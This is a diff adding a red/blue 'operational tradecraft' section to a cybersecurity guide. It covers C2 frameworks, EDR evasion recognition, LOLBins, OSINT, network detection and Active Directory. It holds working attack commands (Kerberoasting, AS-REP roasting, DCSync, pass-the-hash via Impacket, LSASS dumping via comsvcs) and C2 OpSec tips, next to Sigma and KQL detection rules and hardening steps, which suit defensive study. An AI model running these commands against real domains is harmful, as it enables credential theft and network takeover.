@@ -52,6 +52,15 @@
 29. [Python Security Toolkits](#python-security-toolkits)
 30. [PowerShell Security Tools](#powershell-security-tools)
 
+## OPERATIONAL TRADECRAFT
+31. [Tradecraft Overview & Index](#tradecraft-overview)
+32. [C2 Frameworks — Cobalt Strike, Sliver, Havoc](#c2-frameworks)
+33. [AV/EDR Evasion — Recognition & Defense](#av-edr-evasion)
+34. [Living Off the Land — LOLBins & LOLBAs](#lolbins-lolbas)
+35. [OSINT & Threat Intelligence](#osint-threat-intel-tradecraft)
+36. [Network Detection & Packet Analysis](#network-detection-tradecraft)
+37. [Active Directory — Attacks & Defense](#active-directory-tradecraft)
+38. [Analysis Environments (FLARE VM / REMnux)](#analysis-environments)
 ---
 
 # PART 2: OPERATIONAL SECURITY & SETUP
@@ -622,6 +631,15 @@ twint -u username --timeline
 # Instagram loader
 instaloader profile username
 ```
+---
+> 📁 **Extended Reference:** [OSINT & Threat Intelligence Tradecraft](Tradecraft/osint-threat-intel.md)
+>
+> Covers the full OSINT methodology cycle, Maltego/SpiderFoot/Recon-ng on Windows and Linux,
+> Shodan/Censys CLI, amass, trufflehog, dnstwist, MISP/OpenCTI threat intel platforms,
+> IOC lifecycle and STIX/TAXII, dark web monitoring, and investigator OPSEC architecture.
+> Includes platform-by-platform install commands for every major tool.
+ 
+---
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
@@ -1872,6 +1890,23 @@ exercise.add_technique("T1021.001", "RDP", True, "10 minutes")
 # Generate report
 exercise.generate_report()
 ```
+---
+> 📁 **Purple Team Tradecraft Reference:** [Tradecraft/README.md](Tradecraft/README.md)
+>
+> Full tradecraft section maps every file to MITRE ATT&CK tactics.
+> Use with Atomic Red Team to validate detection coverage per technique.
+>
+> ```powershell
+> # Key Atomic Red Team test mappings:
+> Invoke-AtomicTest T1562.001   # AMSI bypass          → av-edr-evasion.md
+> Invoke-AtomicTest T1055       # Process injection     → av-edr-evasion.md
+> Invoke-AtomicTest T1218       # LOLBin execution      → lolbins-lolbas.md
+> Invoke-AtomicTest T1003.001   # LSASS dump            → active-directory.md
+> Invoke-AtomicTest T1558.003   # Kerberoasting         → active-directory.md
+> Invoke-AtomicTest T1071.004   # DNS C2 channel        → network-detection.md
+> ```
+ 
+---
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
@@ -2145,6 +2180,16 @@ metrics = SecurityMetrics()
 # Add data and generate report
 metrics.generate_report()
 ```
+---
+> 📁 **Blue Team Detection References:**
+> - [Network Detection & Packet Analysis](Tradecraft/network-detection.md) — Zeek, Suricata, Wireshark,
+>   pktmon, Windows Firewall logging, Defender for Endpoint KQL, C2 beacon detection, DNS tunneling
+> - [AV/EDR Evasion — Detection & Defense](Tradecraft/av-edr-evasion.md) — AMSI bypass recognition,
+>   ETW tampering detection, process injection Sysmon rules, memory scanning with PE-sieve/Moneta
+> - [Active Directory — Attacks & Defense](Tradecraft/active-directory.md) — Sigma rules for
+>   Kerberoasting, DCSync, AdminSDHolder, Golden Ticket; AD hardening checklist
+ 
+---
 
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
@@ -3751,6 +3796,638 @@ Write-Host ""
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
 
 ---
+
+---
+ 
+# PART 6: OPERATIONAL TRADECRAFT
+ 
+[#operational-tradecraft](#operational-tradecraft)
+ 
+---
+ 
+## Tradecraft Overview
+ 
+[#tradecraft-overview](#tradecraft-overview)
+ 
+Operational tradecraft reference covering the full offensive/defensive cycle —
+C2 frameworks, evasion techniques, living-off-the-land, OSINT methodology,
+network detection, and Active Directory. Each file is dual-perspective:
+offensive technique context + detection artifacts + defensive hardening.
+ 
+### File Index
+ 
+| File | What's Inside | Primary Use |
+|---|---|---|
+| [c2-frameworks.md](Tradecraft/c2-frameworks.md) | Cobalt Strike, Sliver, Havoc, malleable C2, redirectors, OpSec, JA3/YARA detection | Red/Blue |
+| [av-edr-evasion.md](Tradecraft/av-edr-evasion.md) | Static evasion, AMSI/ETW bypass recognition, API hooks, syscalls, injection, sleep obfuscation, FLARE VM/REMnux/Volatility | Blue/Purple |
+| [lolbins-lolbas.md](Tradecraft/lolbins-lolbas.md) | certutil, mshta, regsvr32, wmic, comsvcs.dll, xfreerdp — execution, download, lateral movement, persistence, cred access | Red/Blue |
+| [osint-threat-intel.md](Tradecraft/osint-threat-intel.md) | OSINT methodology, Maltego, SpiderFoot, Shodan, amass, trufflehog, MISP, OpenCTI, IOC lifecycle, investigator OPSEC | OSINT/CTI |
+| [network-detection.md](Tradecraft/network-detection.md) | Zeek, Suricata, Wireshark, pktmon, Defender for Endpoint KQL, C2 beacon detection, DNS tunneling, network forensics | Blue/NSM |
+| [active-directory.md](Tradecraft/active-directory.md) | BloodHound, PowerView, Rubeus, Mimikatz, Impacket, Kerberos attacks, domain persistence, Sigma rules, hardening | Red/Blue |
+ 
+### MITRE ATT&CK Coverage
+ 
+```
+TA0043 Reconnaissance       → osint-threat-intel.md
+TA0011 Command & Control    → c2-frameworks.md, network-detection.md
+TA0005 Defense Evasion      → av-edr-evasion.md, lolbins-lolbas.md
+TA0002 Execution            → lolbins-lolbas.md
+TA0008 Lateral Movement     → lolbins-lolbas.md, active-directory.md
+TA0006 Credential Access    → active-directory.md, lolbins-lolbas.md
+TA0004 Privilege Escalation → active-directory.md
+TA0003 Persistence          → active-directory.md, lolbins-lolbas.md
+TA0010 Exfiltration         → network-detection.md
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## C2 Frameworks
+ 
+[#c2-frameworks](#c2-frameworks)
+ 
+*Full reference: [Tradecraft/c2-frameworks.md](Tradecraft/c2-frameworks.md)*
+ 
+### Framework Comparison
+ 
+| Framework | Language | License | Implant | Key Strength |
+|---|---|---|---|---|
+| **Cobalt Strike** | Java (server) | Commercial | Beacon (C) | Most mature, widest tooling ecosystem |
+| **Sliver** | Go | Open source | Demon (Go) | mTLS, WireGuard, active development |
+| **Havoc** | C/C++, Go | Open source | Demon (C) | Native indirect syscalls, sleep obfuscation |
+ 
+### C2 Architecture
+ 
+```
+[Operator] ──► [Team Server] ──► [Redirector VPS] ──► [Implant on Target]
+                                        │
+                              Nginx with URI filtering
+                              Only forwards known beacon paths
+                              Everything else → legitimate site
+```
+ 
+### Key Operational Concepts
+ 
+- **Sleep/Jitter:** `sleep 300 60` = 5-minute sleep, 60% jitter — minimum for OpSec
+- **Spawnto:** Override default fork-and-run binary — default `WerFault.exe` is signatured
+- **Malleable C2:** Profile that makes beacon traffic mimic legitimate services (Windows Update, CDN)
+- **SMB Beacon:** Named pipe C2 for lateral movement inside network, no internet required
+- **Redirectors:** Never expose team server directly — always proxy through a VPS with URI filtering
+### Detection Signatures
+ 
+```yaml
+# Sigma — C2 beacon timing pattern
+title: Regular Interval Outbound Connection
+logsource:
+    category: network_connection
+detection:
+    selection:
+        Initiated: 'true'
+        DestinationPort:
+            - 80
+            - 443
+    timeframe: 1h
+    condition: selection | count() > 10 by SourceIp,DestinationIp
+    aggregate: stddev(interval) < 5   # low jitter = beacon
+level: medium
+```
+ 
+**Key IOCs:**
+- Regular callback intervals (low standard deviation in connection timing)
+- HTTP POST with consistent small body size (check-in)
+- TLS certificates to domains < 30 days old
+- JA3 hash `6734f37431670b3ab4292b8f60f29984` = Cobalt Strike default profile
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## AV/EDR Evasion — Recognition & Defense
+ 
+[#av-edr-evasion](#av-edr-evasion)
+ 
+*Full reference: [Tradecraft/av-edr-evasion.md](Tradecraft/av-edr-evasion.md)*
+ 
+### Detection Layer Stack
+ 
+```
+Layer 1: Static Signatures        ← AV, hash matching, YARA
+Layer 2: AMSI                     ← PowerShell/script content scanning
+Layer 3: ETW Providers            ← Kernel + user-mode telemetry
+Layer 4: Kernel Callbacks         ← Process/thread/image load events
+Layer 5: User-Mode API Hooks      ← ntdll.dll inline hooks
+Layer 6: Behavioral Analytics     ← ML models, anomaly detection
+Layer 7: Network Inspection       ← DNS, TLS metadata
+```
+ 
+### Recognition Patterns
+ 
+**AMSI bypass in Script Block Log (Event 4104) — what to look for:**
+```
+Any of these strings appearing together = bypass attempt:
+  AmsiScanBuffer, AmsiInitialize, amsiContext, amsiInitFailed
+  [Ref].Assembly.GetType, GetField, NonPublic, SetValue
+```
+ 
+**Patched ntdll function — what it looks like in memory:**
+```asm
+; AmsiScanBuffer PATCHED — bypass succeeded
+B8 57 00 07 80    mov eax, 0x80070057   ← hardcoded "clean" return
+C3                ret                   ← immediate return, no scan
+ 
+; EtwEventWrite PATCHED — ETW silenced
+C3                ret                   ← single byte patch, function does nothing
+```
+ 
+**Process injection Sysmon signatures:**
+```
+Event 8  (CreateRemoteThread)   ← thread injected into another process
+Event 10 (ProcessAccess)        ← cross-process memory access
+Event 25 (ProcessTampering)     ← process hollowing detected
+MEM_PRIVATE + PAGE_EXECUTE      ← RX memory not backed by a file = shellcode
+```
+ 
+### Analysis Environments
+ 
+**Windows — FLARE VM:**
+```powershell
+# https://github.com/mandiant/flare-vm
+Set-ExecutionPolicy Unrestricted -Force && .\install.ps1
+# Key tools: x64dbg, Ghidra, PE-bear, Procmon, Process Hacker,
+#            Regshot, FakeNet-NG, CyberChef, dnSpy, Wireshark
+```
+ 
+**Linux — REMnux:**
+```bash
+wget https://REMnux.org/remnux-cli && sudo mv remnux-cli /usr/local/bin/remnux
+sudo chmod +x /usr/local/bin/remnux && remnux install
+# Key tools: Volatility 3, YARA, Ghidra, radare2/Cutter,
+#            oledump, pdf-parser, NetworkMiner, FakeNet-NG, inetsim
+```
+ 
+**Memory scanning:**
+```powershell
+# PE-sieve — scan for injection/hollowing
+.\pe-sieve64.exe /pid 4892
+ 
+# Volatility 3 — memory forensics
+python3 vol.py -f memory.dmp windows.malfind       # injected code
+python3 vol.py -f memory.dmp windows.hollowprocesses
+```
+ 
+**CyberChef common recipes:**
+```
+Decode PowerShell: From Base64 → Decode text (UTF-16LE)
+Decode PS cradle:  From Base64 → Gunzip → Extract strings
+Decode shellcode:  From Hex → Disassemble x86/x64
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## Living Off the Land — LOLBins & LOLBAs
+ 
+[#lolbins-lolbas](#lolbins-lolbas)
+ 
+*Full reference: [Tradecraft/lolbins-lolbas.md](Tradecraft/lolbins-lolbas.md)*
+ 
+Microsoft-signed Windows binaries abused for malicious execution, download, lateral movement,
+persistence, and credential access. Already present on every Windows system, signed and trusted.
+ 
+### High-Value LOLBins by Category
+ 
+**Execution:**
+ 
+| Binary | Abuse | Detection |
+|---|---|---|
+| `certutil.exe` | Decode/download payloads | `-urlcache`, `-decode` in cmdline |
+| `mshta.exe` | Execute remote HTA/VBScript | Network connection from mshta |
+| `regsvr32.exe` | Remote scriptlet execution (Squiblydoo) | Network connection from regsvr32 |
+| `rundll32.exe` | Execute DLL exports, JavaScript | Unusual cmdline, network connection |
+| `wmic.exe` | Remote process creation, XSL execution | Network connection, child processes |
+| `installutil.exe` | Execute .NET assembly (bypasses AppLocker) | Spawning from non-admin context |
+ 
+**Credential Access:**
+ 
+| Binary | Abuse | Detection |
+|---|---|---|
+| `comsvcs.dll` via rundll32 | LSASS memory dump | `MiniDump` in cmdline, LSASS access |
+| `reg.exe` | SAM/SYSTEM/SECURITY hive export | `save HKLM\SAM` in cmdline |
+| `vssadmin` / `diskshadow` | Shadow copy NTDS.dit access | VSS creation + NTDS path access |
+ 
+**LOLDrivers (BYOVD):** Vulnerable signed drivers used to kill EDR at kernel level.
+Key examples: `gdrv.sys` (Gigabyte), `RTCore64.sys` (MSI Afterburner), `dbutil_2_3.sys` (Dell).
+Resource: [loldrivers.io](https://www.loldrivers.io/)
+ 
+### Detection Priorities
+ 
+```yaml
+title: Suspicious certutil Download
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\certutil.exe'
+        CommandLine|contains:
+            - '-urlcache'
+            - '-decode'
+            - 'http'
+    condition: selection
+level: high
+ 
+---
+ 
+title: LSASS Dump via comsvcs.dll
+logsource:
+    category: process_creation
+    product: windows
+detection:
+    selection:
+        Image|endswith: '\rundll32.exe'
+        CommandLine|contains:
+            - 'comsvcs'
+            - 'MiniDump'
+    condition: selection
+level: critical
+```
+ 
+### Hardening
+ 
+```powershell
+# Attack Surface Reduction — block key LOLBin abuse paths
+$rules = @(
+    "d4f940ab-401b-4efc-aadc-ad5f3c50688a",  # Block Office child processes
+    "3b576869-a4ec-4529-8536-b80a7769e899",  # Block JS/VBS downloaded exec
+    "d1e49aac-8f56-4280-b9ba-993a6d77406c"   # Block PSExec/WMI exec
+)
+$rules | ForEach-Object {
+    Add-MpPreference -AttackSurfaceReductionRules_Ids $_ `
+        -AttackSurfaceReductionRules_Actions Enabled
+}
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## OSINT & Threat Intelligence
+ 
+[#osint-threat-intel-tradecraft](#osint-threat-intel-tradecraft)
+ 
+*Full reference: [Tradecraft/osint-threat-intel.md](Tradecraft/osint-threat-intel.md)*
+ 
+### OSINT Methodology Cycle
+ 
+```
+1. Planning      → Define KIQs, scope, legal authorization, OPSEC requirements
+2. Collection    → Gather from passive and active sources
+3. Processing    → Deduplicate, normalize, enrich
+4. Analysis      → Extract meaning, identify gaps, build picture
+5. Dissemination → Report, act, feed into defenses
+6. Feedback      → Refine collection based on new gaps
+```
+ 
+### Core Tool Stack
+ 
+**Passive infrastructure recon:**
+```bash
+# Subdomain enumeration
+amass enum -passive -d target.com
+subfinder -d target.com
+ 
+# Certificate transparency
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
+ 
+# Shodan CLI
+shodan search org:"Target Corp"
+shodan domain target.com
+ 
+# DNS records + MX (reveals email security posture)
+dig target.com TXT   # SPF, DMARC, domain verification
+dig _dmarc.target.com TXT
+```
+ 
+**Credential/secret exposure:**
+```bash
+trufflehog github --org=targetorg --only-verified   # leaked secrets in repos
+h8mail -t target.com                                 # email breach check
+```
+ 
+**Brand monitoring:**
+```bash
+dnstwist --registered target.com     # typosquatting domains
+# certstream monitoring for new certs containing your domain name
+```
+ 
+**Windows install (pip-based):**
+```powershell
+pip install shodan censys theHarvester trufflehog dnstwist h8mail holehe maigret
+# Go tools: subfinder, amass, assetfinder, gau, waybackurls
+```
+ 
+### Threat Intelligence Platforms
+ 
+| Platform | Type | Best For |
+|---|---|---|
+| VirusTotal | Free/Commercial | File/URL/IP/domain reputation |
+| AlienVault OTX | Free | IOC sharing, community pulses |
+| MISP | Free (self-hosted) | Threat sharing, STIX/TAXII, team sharing |
+| OpenCTI | Free (self-hosted) | CTI platform, actor tracking, relationship mapping |
+| AbuseIPDB | Free | IP reputation, abuse reports |
+| GreyNoise | Free/Commercial | Distinguish targeted vs. internet background noise |
+| Shodan | Free/Commercial | Internet-facing asset intelligence |
+ 
+### IOC Lifecycle
+ 
+```
+Collection → Validation → Enrichment → Scoring → Deployment → Expiration
+ 
+Scoring factors:
+  Source reliability (1–5)
+  Recency (fresh scores higher)
+  Context (targeted vs. generic)
+  Confidence (corroborated by multiple sources)
+  Fidelity (false-positive potential)
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## Network Detection & Packet Analysis
+ 
+[#network-detection-tradecraft](#network-detection-tradecraft)
+ 
+*Full reference: [Tradecraft/network-detection.md](Tradecraft/network-detection.md)*
+ 
+### NSM Stack — Linux
+ 
+```bash
+# Security Onion — full NSM stack (Zeek + Suricata + ELK)
+# https://docs.securityonion.net/
+ 
+# Standalone Zeek
+sudo apt install zeek
+zeek -r capture.pcap
+ 
+# Standalone Suricata
+sudo apt install suricata
+suricata-update                    # update rules
+suricata -r capture.pcap -l /tmp/logs/
+ 
+# Key Zeek logs:
+# conn.log   — all connections: src/dst, bytes, duration, state
+# dns.log    — all DNS queries and responses
+# http.log   — HTTP requests: method, host, URI, user-agent
+# ssl.log    — TLS metadata: SNI, issuer, JA3/JA3S fingerprints
+# files.log  — transferred files with MD5/SHA256
+```
+ 
+### Packet Capture — Windows (No Install Required)
+ 
+```powershell
+# pktmon — built-in Win10 2004+
+pktmon start --capture --file C:\Temp\capture.etl
+pktmon stop
+pktmon etl2pcap C:\Temp\capture.etl --out C:\Temp\capture.pcap
+ 
+# netsh trace — always available
+netsh trace start capture=yes tracefile=C:\Temp\capture.etl maxsize=500
+netsh trace stop
+# Convert with etl2pcapng: https://github.com/microsoft/etl2pcapng
+```
+ 
+### C2 Beacon Detection
+ 
+```python
+# Detect beaconing — low jitter regular intervals in conn.log
+import statistics
+from collections import defaultdict
+ 
+connections = defaultdict(list)
+# [load timestamps per src→dst:port from conn.log]
+ 
+for (src, dst, dport), timestamps in connections.items():
+    if len(timestamps) < 10:
+        continue
+    timestamps.sort()
+    intervals = [timestamps[i+1] - timestamps[i] for i in range(len(timestamps)-1)]
+    mean_i = statistics.mean(intervals)
+    stdev_i = statistics.stdev(intervals) if len(intervals) > 1 else 0
+    jitter = stdev_i / mean_i if mean_i > 0 else 0
+ 
+    if jitter < 0.15 and 30 < mean_i < 3600 and len(timestamps) > 15:
+        print(f"[BEACON?] {src} -> {dst}:{dport} interval={mean_i:.1f}s jitter={jitter:.3f}")
+```
+ 
+### Defender for Endpoint KQL — Key Queries
+ 
+```kusto
+// Beacon timing — regular low-jitter outbound connections
+DeviceNetworkEvents
+| where Timestamp > ago(1h) and ActionType == "ConnectionSuccess"
+| summarize Count=count(), First=min(Timestamp), Last=max(Timestamp)
+    by DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort
+| extend DurationMin = datetime_diff('minute', Last, First)
+| extend ConnPerMin = Count * 1.0 / DurationMin
+| where Count > 10 and ConnPerMin between (0.5 .. 5.0)
+ 
+// DNS to high-entropy domains (DGA/tunnel)
+DeviceEvents
+| where ActionType == "DnsQueryResponse"
+| extend Query = tostring(AdditionalFields.DnsQueryString)
+| where strlen(Query) > 40
+    and Query !contains "microsoft" and Query !contains "windows"
+| summarize count() by DeviceName, Query, InitiatingProcessFileName
+```
+ 
+### Detection Priorities
+ 
+```
+High:  LSASS process access from non-security tools (Sysmon Event 10)
+High:  CreateRemoteThread into non-child process (Sysmon Event 8)
+High:  Regular interval outbound connections with low jitter
+High:  DNS TXT queries at high volume to single domain (DNS tunnel)
+Med:   TLS to newly registered domains (< 30 days)
+Med:   Self-signed certificates on port 443
+Med:   Large DNS responses (> 200 bytes) to single domain
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## Active Directory — Attacks & Defense
+ 
+[#active-directory-tradecraft](#active-directory-tradecraft)
+ 
+*Full reference: [Tradecraft/active-directory.md](Tradecraft/active-directory.md)*
+ 
+### Attack Path Overview
+ 
+```
+Initial Access
+    └──► Local Admin on Workstation
+              └──► Credential Harvest (Mimikatz / LSASS)
+                        ├──► Pass-the-Hash → other workstations
+                        ├──► Kerberoasting → service account hashes → crack offline
+                        └──► BloodHound path → ACL abuse / DA session → Domain Admin
+                                    └──► DCSync → krbtgt hash
+                                              └──► Golden Ticket → persistent DA
+```
+ 
+### Key Offensive Tools
+ 
+**Enumeration (Windows):**
+```powershell
+# BloodHound / SharpHound — map all attack paths
+.\SharpHound.exe -c All --zipfilename bh_data.zip
+# Upload zip to BloodHound GUI → query shortest path to DA
+ 
+# PowerView — manual enumeration
+Get-DomainUser -AdminCount 1                          # admin accounts
+Get-DomainGroupMember "Domain Admins" -Recurse        # DA members
+Find-InterestingDomainAcl -ResolveGUIDs               # misconfigured ACLs
+Find-DomainUserLocation -UserName "DA_User"            # where DA is logged in
+```
+ 
+**Credential attacks (Linux / Impacket):**
+```bash
+# Kerberoasting
+python3 GetUserSPNs.py corp.local/user:Pass -dc-ip DC01 -request -outputfile hashes.txt
+hashcat -m 13100 hashes.txt rockyou.txt
+ 
+# AS-REP roasting (no credentials needed)
+python3 GetNPUsers.py corp.local/ -dc-ip DC01 -no-pass -usersfile users.txt -format hashcat
+hashcat -m 18200 asrep.txt rockyou.txt
+ 
+# DCSync (requires replication rights)
+python3 secretsdump.py 'corp.local/DA_User:Password@DC01'
+ 
+# Pass-the-Hash
+python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
+crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
+```
+ 
+### Key Detection Events
+ 
+| Event ID | Attack | Sigma Rule |
+|---|---|---|
+| 4769 (RC4 cipher) | Kerberoasting | `TicketEncryptionType == 0x17` + not computer account |
+| 4771 | AS-REP roasting / spray | Pre-auth failures in volume |
+| 4662 (replication GUIDs) | DCSync | `1131f6aa` or `1131f6ab` from non-DC |
+| 4624 LogonType 3 + NTLM | Pass-the-hash | Workstation→workstation NTLM lateral movement |
+| 7045 | PsExec / service install | New service from unexpected process |
+| 5136 | AdminSDHolder modification | Write to `CN=AdminSDHolder` |
+ 
+### Hardening Checklist
+ 
+```powershell
+# Disable WDigest — prevents cleartext creds in LSASS
+Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
+    -Name "UseLogonCredential" -Value 0
+ 
+# LSASS Protected Process Light — blocks most dumping
+Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
+ 
+# Protected Users group — removes NTLM, DES/RC4, delegation for privileged accounts
+Add-ADGroupMember -Identity "Protected Users" -Members "DA_User1","DA_User2"
+ 
+# LAPS — randomize local admin passwords
+msiexec /q /i LAPS.x64.msi
+Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=local"
+ 
+# Rotate krbtgt (invalidates golden tickets)
+# https://github.com/microsoft/New-KrbtgtKeys.ps1
+# Must rotate TWICE, 10 hours apart
+```
+ 
+**AD Assessment tools:**
+- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — attack path mapping
+- [Pingcastle](https://www.pingcastle.com/) — free AD health/risk score
+- [Purple Knight](https://www.purple-knight.com/) — free AD security assessment
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
+ 
+---
+ 
+## Analysis Environments
+ 
+[#analysis-environments](#analysis-environments)
+ 
+*Full reference: [Tradecraft/av-edr-evasion.md — Analysis Environments & Tooling Reference](Tradecraft/av-edr-evasion.md#analysis-environments--tooling-reference)*
+ 
+### Windows — FLARE VM (Mandiant)
+ 
+Complete Windows malware analysis workstation. Install on a clean Windows 10/11 VM.
+ 
+```powershell
+# https://github.com/mandiant/flare-vm
+(New-Object net.webclient).DownloadFile(
+    'https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',
+    "$env:USERPROFILE\Downloads\install.ps1"
+)
+Set-ExecutionPolicy Unrestricted -Force
+.\install.ps1
+```
+ 
+**Key tools installed:** x64dbg, IDA Free, Ghidra, PE-bear, CFF Explorer, Detect-It-Easy,
+Process Monitor, Process Hacker, VMMap, Regshot, FakeNet-NG, CyberChef, dnSpy, de4dot, Wireshark
+ 
+### Linux — REMnux
+ 
+Ubuntu-based Linux malware analysis distro. Use alongside FLARE VM.
+ 
+```bash
+wget https://REMnux.org/remnux-cli
+sudo mv remnux-cli /usr/local/bin/remnux && sudo chmod +x /usr/local/bin/remnux
+remnux install
+```
+ 
+**Key tools installed:** Volatility 3, YARA, radare2/Cutter, Ghidra, pestudio, ssdeep,
+oledump, pdfid/pdf-parser, vmonkey, NetworkMiner, Wireshark, FakeNet-NG, inetsim
+ 
+### Cross-Platform Tool Reference
+ 
+| Tool | Windows | Linux | Purpose |
+|---|---|---|---|
+| **Ghidra** | `ghidraRun.bat` | `./ghidraRun` | NSA decompiler, full RE |
+| **Volatility 3** | `python vol.py` | `python3 vol.py` | Memory forensics |
+| **CyberChef** | Browser/Electron | Browser/Node | Decode obfuscated content |
+| **YARA** | `yara64.exe` | `apt install yara` | Pattern matching |
+| **Wireshark** | GUI installer | `apt install wireshark` | PCAP analysis |
+| **Sigma** | Python/sigmac | Python/sigmac | Detection rule format |
+| **Atomic Red Team** | PowerShell module | Bash executor | Purple team testing |
+| **Impacket** | `pip install impacket` | `pip3 install impacket` | Windows protocol toolkit |
+| **CrackMapExec** | `pip install cme` | `apt install cme` | SMB/AD testing |
+| **Hashcat** | `hashcat.exe` | `hashcat` | Hash cracking |
+| **PE-sieve** | Native Windows | ❌ | Process injection scanner |
+| **Moneta** | Native Windows | ❌ | In-memory IOC scanner |
+| **Zeek** | Limited | ✅ primary | Protocol log generation |
+| **pktmon** | Built-in Win10+ | ❌ | Windows packet capture |
+| **tcpdump** | ❌ (use pktmon) | ✅ native | Live capture/scripting |
+ 
+### Quick Environment Selection
+ 
+```
+Analyzing Windows malware?
+  → FLARE VM (static) + Process Monitor (dynamic) + PE-sieve (memory)
+ 
+Analyzing Linux ELF?
+  → REMnux + pwndbg + rizin/Cutter + strace/ltrace
+ 
+Decoding obfuscated script?
+  → CyberChef (any platform, browser-based)
+ 
+Full behavioral analysis?
+  → CAPE Sandbox (self-hosted Ubuntu) — auto-extracts C2 configs
+ 
+Memory forensics?
+  → Volatility 3 (either platform) + pe-sieve (Windows live process)
+```
+ 
+[Return to Table of Contents](#table-of-contents---enhanced-edition)
 
 **END OF ENHANCED CYBERSECURITY MASTER GUIDE**
 
